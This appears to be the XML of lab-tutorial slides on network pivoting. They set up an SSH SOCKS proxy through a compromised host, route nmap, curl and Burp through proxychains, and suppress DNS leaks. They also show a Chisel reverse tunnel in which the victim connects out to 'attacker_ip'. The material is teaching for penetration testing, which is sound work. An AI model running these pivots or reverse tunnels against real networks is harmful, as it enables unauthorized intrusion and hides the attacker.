              <a:t>only valid when SSH access to Machine 1 exists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Step 1 — On Kali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SOCKS Proxy (SSH Dynamic Port Forwarding)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Kali:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="en-US" sz="1600" dirty="0">
              <a:latin typeface="Arial Unicode MS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 err="1">
                <a:latin typeface="Arial Unicode MS"/>
              </a:rPr>
              <a:t>ssh</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1600" dirty="0">
                <a:latin typeface="Arial Unicode MS"/>
              </a:rPr>
              <a:t> -D 1080 user@machine1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 Unicode MS"/>
              </a:rPr>
              <a:t>Or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 err="1">
                <a:latin typeface="Arial Unicode MS"/>
              </a:rPr>
              <a:t>ssh</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1600" dirty="0">
                <a:latin typeface="Arial Unicode MS"/>
              </a:rPr>
              <a:t> \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 Unicode MS"/>
              </a:rPr>
              <a:t>-o </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1600" dirty="0" err="1">
                <a:latin typeface="Arial Unicode MS"/>
              </a:rPr>
              <a:t>HostKeyAlgorithms</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1600" dirty="0">
                <a:latin typeface="Arial Unicode MS"/>
              </a:rPr>
              <a:t>=+</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1600" dirty="0" err="1">
                <a:latin typeface="Arial Unicode MS"/>
              </a:rPr>
              <a:t>ssh-rsa</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1600" dirty="0">
                <a:latin typeface="Arial Unicode MS"/>
              </a:rPr>
              <a:t> \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 Unicode MS"/>
              </a:rPr>
              <a:t>-o </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1600" dirty="0" err="1">
                <a:latin typeface="Arial Unicode MS"/>
              </a:rPr>
              <a:t>PubkeyAcceptedAlgorithms</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1600" dirty="0">
                <a:latin typeface="Arial Unicode MS"/>
              </a:rPr>
              <a:t>=+</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1600" dirty="0" err="1">
                <a:latin typeface="Arial Unicode MS"/>
              </a:rPr>
              <a:t>ssh-rsa</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1600" dirty="0">
                <a:latin typeface="Arial Unicode MS"/>
              </a:rPr>
              <a:t> \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 Unicode MS"/>
              </a:rPr>
              <a:t>-D 1080 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1600" dirty="0">
                <a:latin typeface="Arial Unicode MS"/>
                <a:hlinkClick r:id="rId2"/>
              </a:rPr>
              <a:t>msfadmin@192.168.1.44</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="en-US" sz="16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that still fails because only DSA is offered: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ssh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\ -o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HostKeyAlgorithms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=+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ssh-dss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\ -o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PubkeyAcceptedAlgorithms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=+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ssh-dss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\ -D 1080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hlinkClick r:id="rId2"/>
              </a:rPr>
              <a:t>msfadmin@192.168.1.44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(Use the correct username if it isn't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msfadmin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latin typeface="Arial Unicode MS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latin typeface="Arial Unicode MS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latin typeface="Arial Unicode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17C6B2-616A-4B71-AFBB-C199E11E88B9}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6096000" y="0"/>
            <a:ext cx="6313714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👉 Creates SOCKS proxy on:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="en-US" sz="1800" dirty="0">
              <a:latin typeface="Arial Unicode MS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</a:rPr>
              <a:t>127.0.0.1:1080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1800" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="1F4D78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this does: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Opens a </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US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SOCKS proxy on Kali</a:t>
            </a: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altLang="en-US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Listening on:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="en-US" sz="18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127.0.0.1:1080</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1800" dirty="0"/>
              <a:t>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Any traffic sent there → forwarded through Machine1 </a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="en-US" sz="1800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 Think of Machine1 as your </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1800" b="1" dirty="0">
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
                <a:ea typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>pivot gateway</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="en-US" sz="1800" dirty="0">
              <a:latin typeface="Arial Unicode MS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2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Step2 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US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Proxychains</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2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Setup</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="en-US" sz="2000" dirty="0"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Edit config:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="en-US" sz="2000" dirty="0"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nano /</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="20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0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proxychains.conf</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="en-US" sz="2000" dirty="0"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 at bottom:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="en-US" sz="2000" dirty="0"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20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strict_chain</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" alt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20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proxy_dns</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" alt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socks5 127.0.0.1 1080</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="590670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2A7691-F720-47F2-8B06-D9BA19C93D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915" y="0"/>
            <a:ext cx="8394620" cy="6139543"/>
          </a:xfrm>
        </p:spPr>
      </p:pic>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="1848765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89"/>
            <a:ext cx="5471886" cy="7068983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Step 3 — Use tools done from the kali </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2000" b="1" dirty="0" err="1">
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>linux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 Unicode MS"/>
              </a:rPr>
              <a:t>proxychains nmap -</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2000" dirty="0" err="1">
                <a:latin typeface="Arial Unicode MS"/>
              </a:rPr>
              <a:t>sT</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2000" dirty="0">
                <a:latin typeface="Arial Unicode MS"/>
              </a:rPr>
              <a:t> 192.168.1.10</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" altLang="en-US" sz="2000" dirty="0">
                <a:latin typeface="Arial Unicode MS"/>
              </a:rPr>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2000" dirty="0">
                <a:latin typeface="Arial Unicode MS"/>
              </a:rPr>
              <a:t>proxychains curl http://192.168.1.10</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" altLang="en-US" sz="2000" dirty="0">
                <a:latin typeface="Arial Unicode MS"/>
              </a:rPr>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2000" dirty="0">
                <a:latin typeface="Arial Unicode MS"/>
              </a:rPr>
              <a:t>proxychains firefox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à"/>
              <a:tabLst>
                <a:tab pos="457200" algn="l"/>
              </a:tabLst>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2000" dirty="0">
                <a:latin typeface="Arial Unicode MS"/>
              </a:rPr>
              <a:t>192.168.1.10  </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2000" dirty="0">
                <a:latin typeface="Arial Unicode MS"/>
                <a:sym typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              </a:rPr>
              <a:t> This is the IP address which you have got in Task 1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— Use </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1"/>
              <a:t>proxychains</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t> (on Kali) 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err="1">
                <a:latin typeface="Arial Unicode MS"/>
              </a:rPr>
              <a:t>proxychains</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2000" dirty="0">
                <a:latin typeface="Arial Unicode MS"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2000" dirty="0" err="1">
                <a:latin typeface="Arial Unicode MS"/>
              </a:rPr>
              <a:t>nmap</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2000" dirty="0">
                <a:latin typeface="Arial Unicode MS"/>
              </a:rPr>
              <a:t> 192.168.1.10 Or Better alternative!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err="1"/>
              <a:t>proxychains</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1"/>
              <a:t>nmap</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t> -</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1"/>
              <a:t>sT</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t> -</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1"/>
              <a:t>Pn</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t> 192.168.1.10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/>
              <a:t>✔ Verify tunnel is active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For SSH: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ssh</a:t>
            </a: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-D 1080 user@machine1</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2000" dirty="0"/>
              <a:t>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endParaRPr lang="en-US" altLang="en-US" sz="20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altLang="en-US" sz="2000" dirty="0">
              <a:latin typeface="Arial Unicode MS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6B4F21-994A-475A-B23F-7296636AC5DE}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5925457" y="0"/>
            <a:ext cx="6132284" cy="5027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Optional test (very clean step)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latin typeface="Arial Unicode MS"/>
              </a:rPr>
              <a:t>proxychains</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1800" dirty="0">
                <a:latin typeface="Arial Unicode MS"/>
              </a:rPr>
              <a:t> curl http://ifconfig.me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/>
              <a:t>👉 Confirms traffic is going through proxy</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1800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STEP 4 — Route Your Tools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/>
              <a:t>Now route tools. </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0"/>
              <a:t>Now EVERYTHING goes through Machine1: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Scan internal host</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="en-US" sz="1800" dirty="0">
              <a:latin typeface="Arial Unicode MS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latin typeface="Arial Unicode MS"/>
              </a:rPr>
              <a:t>proxychains</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1800" dirty="0">
                <a:latin typeface="Arial Unicode MS"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1800" dirty="0" err="1">
                <a:latin typeface="Arial Unicode MS"/>
              </a:rPr>
              <a:t>nmap</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1800" dirty="0">
                <a:latin typeface="Arial Unicode MS"/>
              </a:rPr>
              <a:t> -</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1800" dirty="0" err="1">
                <a:latin typeface="Arial Unicode MS"/>
              </a:rPr>
              <a:t>sT</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1800" dirty="0">
                <a:latin typeface="Arial Unicode MS"/>
              </a:rPr>
              <a:t> 192.168.1.10</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1800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🌐 Browse internal web apps</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" altLang="en-US" sz="1800" dirty="0">
                <a:latin typeface="Arial Unicode MS"/>
              </a:rPr>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1800" dirty="0" err="1">
                <a:latin typeface="Arial Unicode MS"/>
              </a:rPr>
              <a:t>proxychains</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1800" dirty="0">
                <a:latin typeface="Arial Unicode MS"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1800" dirty="0" err="1">
                <a:latin typeface="Arial Unicode MS"/>
              </a:rPr>
              <a:t>firefox</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="en-US" sz="18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🌐 Basic connectivity testing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rgbClr val="FF0000"/>
                </a:solidFill>
                <a:latin typeface="Arial Unicode MS"/>
              </a:rPr>
              <a:t>curl</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1800" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="en-US" sz="1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latin typeface="Arial Unicode MS"/>
              </a:rPr>
              <a:t>proxychains</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1800" dirty="0">
                <a:latin typeface="Arial Unicode MS"/>
              </a:rPr>
              <a:t> curl http://192.168.1.10</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="en-US" sz="1800" b="1" dirty="0">
              <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:ea typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              <a:cs typeface="Segoe UI Symbol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810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/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1" noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="0" y="225513"/>
            <a:ext cx="6749143" cy="5983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Option 1 (Recommended for labs) — Burp + SOCKS directly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No proxychains needed here</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="en-US" sz="1800" dirty="0">
              <a:solidFill>
                <a:srgbClr val="1F4D78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solidFill>
                  <a:srgbClr val="7030A0"/>
                </a:solidFill>
                <a:latin typeface="Arial Black" panose="020B0A04020102020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>Step 1 — Start your tunnel (already done)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SSH / Metasploit / Chisel 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SOCKS proxy running at: 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</a:rPr>
              <a:t>127.0.0.1:1080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F4D78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F4D78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Open Burp Suite on Kali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2 — Configure upstream SOCKS proxy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Inside Burp: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Proxy → Options → Upstream Proxy Servers → Add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en-US" altLang="en-US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Arial Black" panose="020B0A04020102020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>Step 3 — Set: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Arial Black" panose="020B0A040201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870543"/>
              </p:ext>
            </p:extLst>
          </p:nvPr>
        </p:nvGraphicFramePr>
        <p:xfrm>
          <a:off x="0" y="4018761"/>
          <a:ext cx="248817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0876">
                  <a:extLst>
                    <a:ext uri="{9D8B030D-6E8A-4147-A177-3AD203B41FA5}">
                      <a16:colId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="375300296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3521467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790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SOCKS5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619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127.0.0.1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594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44371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24F3BD3-8794-4501-A2DC-534055B722B9}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7366000" y="79625"/>
            <a:ext cx="45502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Step 4 — Use browser with Burp</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Open the browser.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Set the browser proxy to 127.0.0.1:8080</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>(Burp’s local listener)</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="3709515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2875"/>
            <a:ext cx="12192000" cy="68580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/>
              <a:t>Step 5 — Access internal app</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>Go to http://192.168.1.10</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>Traffic flow:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>Browser → Burp → SOCKS proxy (127.0.0.1:1080) → Machine1 → Target</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>In Burp, make sure Intercept is ON to capture requests.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>Burp can also be configured with an upstream SOCKS proxy (127.0.0.1:1080), which lets you intercept and modify traffic while reaching internal web applications through the pivot.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>Web Application Testing (Optional Advanced Step):</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="0"/>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>Instead of proxychains, Burp Suite can be configured to use the SOCKS proxy (127.0.0.1:1080) as an upstream proxy.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="0"/>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>This allows interception and modification of HTTP traffic while accessing internal web applications through the pivot.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" lvl="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr 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769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5400" b="1" dirty="0">
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>🔥 Final Takeaway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 Unicode MS"/>
              </a:rPr>
              <a:t>Nmap → find targets</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" altLang="en-US" sz="2000" dirty="0">
                <a:latin typeface="Arial Unicode MS"/>
              </a:rPr>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2000" dirty="0">
                <a:latin typeface="Arial Unicode MS"/>
              </a:rPr>
              <a:t>curl → verify access</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" altLang="en-US" sz="2000" dirty="0">
                <a:latin typeface="Arial Unicode MS"/>
              </a:rPr>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2000" dirty="0">
                <a:latin typeface="Arial Unicode MS"/>
              </a:rPr>
              <a:t>Burp → exploit web apps</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="en-US" sz="4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921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0"/>
            <a:ext cx="4775200" cy="4759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1900" b="1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⚠</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1900" b="1" dirty="0">
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
                <a:ea typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>️ Important Real-World Notes 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19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❗</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="19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1. Use </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="19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-sT</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="19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NOT </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="19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–</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="19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sS</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="19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                                          </a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="en-US" sz="1900" dirty="0"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SYN scan (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1900" dirty="0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-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1900" dirty="0" err="1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sS</a:t>
            </a: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= </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="19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won’t work over SOCKS</a:t>
            </a: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altLang="en-US" sz="1900" dirty="0"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sz="19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19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-sT (TCP connect scan)</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="19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2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❗</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="20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2. </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>Prevent DNS leaks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sz="2000" dirty="0" err="1"/>
              <a:t>nano</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t> /</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1"/>
              <a:t>etc</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1"/>
              <a:t>proxychains.conf</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2000" dirty="0"/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20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 in proxychains </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2000" dirty="0" err="1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en-US" altLang="en-US" sz="20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Find this line:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="en-US" sz="2000" dirty="0">
              <a:latin typeface="Arial Unicode MS"/>
            </a:endParaRP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 Unicode MS"/>
              </a:rPr>
              <a:t>#</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2000" dirty="0" err="1">
                <a:latin typeface="Arial Unicode MS"/>
              </a:rPr>
              <a:t>proxy_dns</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="en-US" sz="2000" dirty="0">
              <a:latin typeface="Arial Unicode MS"/>
            </a:endParaRP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/>
              <a:t>👉 Remove </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2000" dirty="0">
                <a:latin typeface="Arial Unicode MS"/>
              </a:rPr>
              <a:t>#</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2000" dirty="0"/>
              <a:t>:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="en-US" sz="20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20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proxy_dns</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="20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11251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F36560-DFE1-41E7-BD5D-51ABED4030E8}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4775200" y="297180"/>
            <a:ext cx="7416799" cy="2583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1800" dirty="0">
                <a:latin typeface="Calibri Light" panose="020F03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8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Prevents your real IP from leaking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18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Without </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1800" dirty="0" err="1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proxy_dns</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="18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DNS requests may go directly from Kali, exposing your real IP.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18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altLang="en-US" sz="1800" dirty="0" err="1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proxy_dns</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="18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enabled, DNS queries are routed through the tunnel.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18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❗</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="18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3. Speed is slow </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1800" dirty="0">
                <a:latin typeface="Calibri Light" panose="020F03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🐢</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="en-US" sz="1800" dirty="0"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You’re tunneling → expect lag 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Keep scans targeted, not full /24 sweeps </a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="33838608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1800" b="1" dirty="0">
                <a:latin typeface="Calibri Light" panose="020F03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🔥</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1800" b="1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Alternative: Using Chisel (More Flexible)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18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SSH isn’t available or restricted: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18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Kali (server):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chisel server -p 8000 --reverse</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="18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18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Machine1 (victim):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chisel client attacker_ip:8000 R:socks</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="18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1800" dirty="0">
                <a:latin typeface="Calibri Light" panose="020F03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8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This creates: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SOCKS proxy on Kali (default 1080)</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="18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702418"/>
              </p:ext>
            </p:extLst>
          </p:nvPr>
        </p:nvGraphicFramePr>
        <p:xfrm>
          <a:off x="0" y="3429000"/>
          <a:ext cx="5165633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158">
                  <a:extLst>
                    <a:ext uri="{9D8B030D-6E8A-4147-A177-3AD203B41FA5}">
                      <a16:colId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="3187367341"/>
                    </a:ext>
                  </a:extLst>
                </a:gridCol>
                <a:gridCol w="2849475">
                  <a:extLst>
                    <a:ext uri="{9D8B030D-6E8A-4147-A177-3AD203B41FA5}">
                      <a16:colId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="1858486683"/>
                    </a:ext>
                  </a:extLst>
                </a:gridCol>
              </a:tblGrid>
              <a:tr h="311211">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" dirty="0"/>
                        <a:t>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Where to run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627517"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="311211">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" dirty="0"/>
                        <a:t>ssh -D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Kali terminal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4560155"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="311211">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" dirty="0"/>
                        <a:t>proxychains </a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" dirty="0" err="1"/>
                        <a:t>config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Kali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4505240"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="311211">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" dirty="0"/>
                        <a:t>proxychains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Kali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4674165"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="311211">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
